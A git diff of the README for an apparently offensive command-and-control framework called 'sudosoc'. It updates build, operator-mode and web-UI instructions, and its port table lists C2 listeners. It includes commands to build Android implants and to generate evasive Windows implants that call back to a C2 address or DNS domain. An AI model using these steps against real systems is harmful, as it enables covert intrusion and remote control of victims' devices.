@@ -259,27 +259,64 @@ Features: ROP chain, heap spray (512 objects), polymorphic per-target, multi-arc
 ### Build
 
 ```bash
-# Linux/macOS
+# ── Linux / macOS (full build: UI + server + client) ──────────────────────
 make
 
-# Windows PowerShell
-go build -mod=vendor -o sudosoc-server.exe ./server
-go build -mod=vendor -o sudosoc-client.exe ./client
+# Skip Web UI rebuild (fast re-run after first build)
+make UI_SKIP=1
 
-# Android implant
-$env:GOOS="android"; $env:GOARCH="arm64"; $env:CGO_ENABLED="0"
-go build -tags android -mod=vendor -o phantom_android_arm64 ./implant
+# Build only Go binaries (UI already built)
+make server-only
+
+# Build Web UI only
+make ui
+
+# ── Windows PowerShell ──────────────────────────────────────────────────────
+make                        # full build (runs npm + go build)
+make server-only            # fast rebuild, skips npm
+go build -mod=vendor -tags "go_sqlite,server" -o sudosoc-server.exe ./server
+go build -mod=vendor -tags "go_sqlite,client" -o sudosoc-client.exe ./client
+
+# ── Cross-compile (example: Linux binary from macOS/Windows) ───────────────
+make linux-amd64            # includes Web UI
+make UI_SKIP=1 linux-amd64 # skips npm (UI already in server/web/dist/)
+
+# ── Android implant ─────────────────────────────────────────────────────────
+make android-arm64          # ARM64 (most modern devices)
+make android-all            # all architectures
+make android-apk            # APK package
 ```
 
-### Run
+### Operator Modes
 
 ```bash
-# Server
+# ── Terminal Mode (default) ─────────────────────────────────────────────────
 ./sudosoc-server
 
-# Client
-./sudosoc-client
+# ── TUI Mode — rich bubbletea dashboard ─────────────────────────────────────
+./sudosoc-server --tui
 
+# ── Web UI Mode — browser dashboard on localhost:8080 ───────────────────────
+./sudosoc-server --ui
+./sudosoc-server --ui --ui-port 9090
+
+# ── Live toggle (no restart needed) ─────────────────────────────────────────
+# From inside the terminal/TUI:
+sudosoc > ui start
+sudosoc > ui start --port 9090
+sudosoc > ui stop
+sudosoc > ui status
+
+# Via signal (Unix/macOS only):
+kill -USR1 $(pidof sudosoc-server)
+
+# ── Remote operator client ───────────────────────────────────────────────────
+./sudosoc-client
+```
+
+### Generate Implants & Listeners
+
+```bash
 # Generate implant
 sudosoc > generate --mtls <C2_IP> --os windows --arch amd64 --evasion --save /tmp/
 
@@ -301,6 +338,7 @@ sudosoc > dns --domains c2.sudosoc.com
 | DNS C2 | 53 | UDP |
 | WireGuard | 51820 | UDP |
 | **Multiplayer** | **47443** | **TCP** |
+| **Web UI** | **8080** | **TCP** |
 
 ---
 
